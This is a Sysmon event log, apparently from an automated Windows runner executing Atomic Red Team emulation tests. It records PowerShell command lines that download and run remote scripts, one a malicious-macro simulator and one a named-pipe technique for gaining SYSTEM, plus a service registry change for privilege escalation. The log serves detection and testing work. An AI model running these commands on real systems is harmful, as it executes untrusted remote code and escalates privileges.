UtcTime: 2025-12-17 07:58:44.690
ProcessGuid: {f995aebf-62b4-6942-bc03-000000000e00}
ProcessId: 8932
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_yby2yapi.05a.ps1
CreationUtcTime: 2025-12-17 07:58:44.690
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:44 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:58:44.594
ProcessGuid: {f995aebf-62b4-6942-bc03-000000000e00}
ProcessId: 8932
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"""" -UseBasicParsing)
$macrocode = \""""   Open `\""""C:\Users\Public\art.jse`\"""" For Output As #1`n   Write #1, `\""""WScript.Quit`\""""`n   Close #1`n   Shell`$ `\""""cscript.exe C:\Users\Public\art.jse`\""""`n\""""
Invoke-MalDoc -macroCode $macrocode -officeProduct \""""Word\""""}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-5a02-000000000e00}
ParentProcessId: 7900
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\76082473-4233-4a75-96ef-919776028fb6.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:43 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:43.157
ProcessGuid: {f995aebf-62b3-6942-b803-000000000e00}
ProcessId: 4852
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_k55zq35u.1ri.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:43 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:58:43.137
ProcessGuid: {f995aebf-62b3-6942-b803-000000000e00}
ProcessId: 4852
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_k55zq35u.1ri.ps1
CreationUtcTime: 2025-12-17 07:58:43.137
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:42 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:42.780
ProcessGuid: {f995aebf-62b2-6942-b603-000000000e00}
ProcessId: 8712
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_l522uqdf.mgv.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:42 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:58:42.759
ProcessGuid: {f995aebf-62b2-6942-b603-000000000e00}
ProcessId: 8712
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_l522uqdf.mgv.ps1
CreationUtcTime: 2025-12-17 07:58:42.759
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:42 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:42.403
ProcessGuid: {f995aebf-62b2-6942-b403-000000000e00}
ProcessId: 10060
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_sfpue5wj.hs0.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:42 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:58:42.381
ProcessGuid: {f995aebf-62b2-6942-b403-000000000e00}
ProcessId: 10060
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_sfpue5wj.hs0.ps1
CreationUtcTime: 2025-12-17 07:58:42.381
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:42 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:42.013
ProcessGuid: {f995aebf-62b1-6942-b203-000000000e00}
ProcessId: 7448
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_on2xozmt.myj.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:41 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:58:41.993
ProcessGuid: {f995aebf-62b1-6942-b203-000000000e00}
ProcessId: 7448
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_on2xozmt.myj.ps1
CreationUtcTime: 2025-12-17 07:58:41.993
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:37 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:37.367
ProcessGuid: {f995aebf-62ad-6942-a703-000000000e00}
ProcessId: 7280
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_djssele1.3fr.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:37 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:58:37.347
ProcessGuid: {f995aebf-62ad-6942-a703-000000000e00}
ProcessId: 7280
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_djssele1.3fr.ps1
CreationUtcTime: 2025-12-17 07:58:37.347
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:35 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:58:35.063
ProcessGuid: {f995aebf-62ab-6942-a603-000000000e00}
ProcessId: 10140
Image: C:\Windows\System32\sc.exe
FileVersion: 10.0.26100.4484 (WinBuild.160101.0800)
Description: Service Control Manager Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: sc.exe
CommandLine: sc.exe  delete svcHighPriv
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=A452BFCB6000D03942DDFADDCDA5A7EB121447ED99B1BA090446B4A989F1F7AE
ParentProcessGuid: {f995aebf-62ab-6942-a403-000000000e00}
ParentProcessId: 8056
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""C:\Windows\System32\cmd.exe""  /C sc.exe delete svcHighPriv
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:33 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:33.597
ProcessGuid: {f995aebf-62a9-6942-a203-000000000e00}
ProcessId: 3144
User: NT AUTHORITY\SYSTEM
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Windows\SystemTemp\__PSScriptPolicyTest_spmu032i.nch.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:33 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:33.131
ProcessGuid: {f995aebf-62a9-6942-9e03-000000000e00}
ProcessId: 9780
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_zlkxuhmm.hsy.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:33 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:58:33.110
ProcessGuid: {f995aebf-62a9-6942-9e03-000000000e00}
ProcessId: 9780
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_zlkxuhmm.hsy.ps1
CreationUtcTime: 2025-12-17 07:58:33.110
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:32 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 07:58:29.806
ProcessGuid: {f995aebf-62a5-6942-9803-000000000e00}
ProcessId: 6760
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 53464
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.108.133
DestinationHostname: cdn-185-199-108-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 7:58:31 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 07:58:29.802
ProcessGuid: {f995aebf-62a5-6942-9803-000000000e00}
ProcessId: 6760
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;::ffff:185.199.111.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:30 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 07:58:30.316
ProcessGuid: {f995aebf-5f5c-6942-0c00-000000000e00}
ProcessId: 972
Image: C:\Windows\system32\services.exe
TargetObject: HKLM\System\CurrentControlSet\Services\svcHighPriv\ImagePath
Details: C:\windows\system32\cmd.exe /C echo Uuup! > \\.\pipe\HighPriv
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:58:30 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:30.132
ProcessGuid: {f995aebf-62a6-6942-9c03-000000000e00}
ProcessId: 9112
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_0pfropqd.pa4.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:30 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:58:30.112
ProcessGuid: {f995aebf-62a6-6942-9c03-000000000e00}
ProcessId: 9112
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_0pfropqd.pa4.ps1
CreationUtcTime: 2025-12-17 07:58:30.112
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:29 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:29.974
ProcessGuid: {f995aebf-62a5-6942-9803-000000000e00}
ProcessId: 6760
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\5wb3lzhd\5wb3lzhd.dll
Hashes: SHA256=5EE716EAB92D74DB4473F4DDDC901440E07260E75F4C0BFA4490B9E88EE0E05D
IsExecutable: true
Archived: true"
"12/17/2025 7:58:29 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:58:29.956
ProcessGuid: {f995aebf-62a5-6942-9a03-000000000e00}
ProcessId: 5616
Image: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\5wb3lzhd\5wb3lzhd.dll
CreationUtcTime: 2025-12-17 07:58:29.832
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:29 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:29.956
ProcessGuid: {f995aebf-62a5-6942-9a03-000000000e00}
ProcessId: 5616
User: runnervm8j6r3\runneradmin
Image: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\5wb3lzhd\5wb3lzhd.dll
Hashes: SHA256=E3B0C44298FC1C149AFBF4C8996FB92427AE41E4649B934CA495991B7852B855
IsExecutable: false
Archived: true"
"12/17/2025 7:58:29 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:58:29.832
ProcessGuid: {f995aebf-62a5-6942-9803-000000000e00}
ProcessId: 6760
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\5wb3lzhd\5wb3lzhd.dll
CreationUtcTime: 2025-12-17 07:58:29.832
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:29 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:29.573
ProcessGuid: {f995aebf-62a5-6942-9803-000000000e00}
ProcessId: 6760
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_drbvobdx.xmm.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:29 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:58:29.549
ProcessGuid: {f995aebf-62a5-6942-9803-000000000e00}
ProcessId: 6760
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_drbvobdx.xmm.ps1
CreationUtcTime: 2025-12-17 07:58:29.549
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:29 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:58:29.470
ProcessGuid: {f995aebf-62a5-6942-9803-000000000e00}
ProcessId: 6760
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1')}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-5a02-000000000e00}
ParentProcessId: 7900
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\76082473-4233-4a75-96ef-919776028fb6.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:29 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 07:58:29.049
ProcessGuid: {f995aebf-62a5-6942-9703-000000000e00}
ProcessId: 1548
Image: C:\Windows\System32\wbem\WmiPrvSE.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\NETWORK SERVICE"
"12/17/2025 7:57:43 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 07:57:43.732
SourceProcessGUID: {f995aebf-61e8-6942-0d03-000000000e00}
SourceProcessId: 6500
SourceThreadId: 6736
SourceImage: C:\Windows\system32\compattelrunner.exe
TargetProcessGUID: {f995aebf-5f5c-6942-0d00-000000000e00}
TargetProcessId: 992
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1000
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+3fba6|C:\Windows\SYSTEM32\aeinv.dll+22b55|C:\Windows\SYSTEM32\aeinv.dll+39fa3|C:\Windows\SYSTEM32\aeinv.dll+74d22|C:\Windows\SYSTEM32\aeinv.dll+48f80|C:\Windows\SYSTEM32\aeinv.dll+53228|C:\Windows\SYSTEM32\aeinv.dll+5365c|C:\Windows\system32\compattelrunner.exe+b57e|C:\Windows\system32\compattelrunner.exe+c7fb|C:\Windows\system32\compattelrunner.exe+1f5b|C:\Windows\System32\KERNEL32.DLL+2e8d7|C:\Windows\SYSTEM32\ntdll.dll+8c53c
SourceUser: NT AUTHORITY\SYSTEM
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 7:56:33 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 07:56:31.549
ProcessGuid: {f995aebf-622d-6942-8503-000000000e00}
ProcessId: 3636
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: NT AUTHORITY\SYSTEM
Protocol: tcp
Initiated: false
SourceIsIpv6: false
SourceIp: 127.0.0.1
SourceHostname: runnervm8j6r3
SourcePort: 53412
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 127.0.0.1
DestinationHostname: runnervm8j6r3
DestinationPort: 4444
DestinationPortName: -"
"12/17/2025 7:56:33 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 07:56:31.549
ProcessGuid: {f995aebf-622c-6942-8103-000000000e00}
ProcessId: 7292
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 127.0.0.1
SourceHostname: runnervm8j6r3
SourcePort: 53412
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 127.0.0.1
DestinationHostname: runnervm8j6r3
DestinationPort: 4444
DestinationPortName: -"
"12/17/2025 7:56:30 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 07:56:29.336
ProcessGuid: {f995aebf-622c-6942-8103-000000000e00}
ProcessId: 7292
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 53411
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.108.133
DestinationHostname: cdn-185-199-108-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 7:56:30 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 07:56:28.483
ProcessGuid: {f995aebf-622c-6942-7903-000000000e00}
ProcessId: 4940
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 53410
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.108.133
DestinationHostname: cdn-185-199-108-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 7:56:30 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 07:56:29.332
ProcessGuid: {f995aebf-622c-6942-8103-000000000e00}
ProcessId: 7292
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;::ffff:185.199.111.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:30 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 07:56:28.478
ProcessGuid: {f995aebf-622c-6942-7903-000000000e00}
ProcessId: 4940
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;::ffff:185.199.111.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:29 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:56:29.956
ProcessGuid: {f995aebf-622d-6942-8503-000000000e00}
ProcessId: 3636
User: NT AUTHORITY\SYSTEM
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Windows\SystemTemp\1bijofyf\1bijofyf.dll
Hashes: SHA256=DAAB0BFB49AF9E7C0129C97638D8BA6758FF6AE9B319C1CB5B7ACB1336F94F14
IsExecutable: true
Archived: true"
"12/17/2025 7:56:29 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:56:29.946
ProcessGuid: {f995aebf-622d-6942-8703-000000000e00}
ProcessId: 3912
User: NT AUTHORITY\SYSTEM
Image: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
TargetFilename: C:\Windows\SystemTemp\1bijofyf\1bijofyf.dll
Hashes: SHA256=E3B0C44298FC1C149AFBF4C8996FB92427AE41E4649B934CA495991B7852B855
IsExecutable: false
Archived: true"
"12/17/2025 7:56:29 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:56:29.639
ProcessGuid: {f995aebf-622d-6942-8503-000000000e00}
ProcessId: 3636
User: NT AUTHORITY\SYSTEM
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Windows\SystemTemp\__PSScriptPolicyTest_s1jj2xkv.qca.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
